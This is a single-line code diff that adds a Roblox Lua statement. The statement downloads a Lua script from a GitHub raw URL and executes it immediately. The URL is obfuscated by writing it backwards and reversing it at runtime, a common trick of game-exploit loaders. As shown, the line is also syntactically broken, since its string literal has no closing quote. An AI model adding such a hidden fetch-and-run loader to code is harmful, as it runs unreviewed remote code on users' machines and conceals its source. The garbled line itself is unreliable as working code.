@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(string.reverse('aul.ecnetneSefiL/niam/otnak/lufiknad/moc.tnetnocresubuhtig.war//:sptth)))()
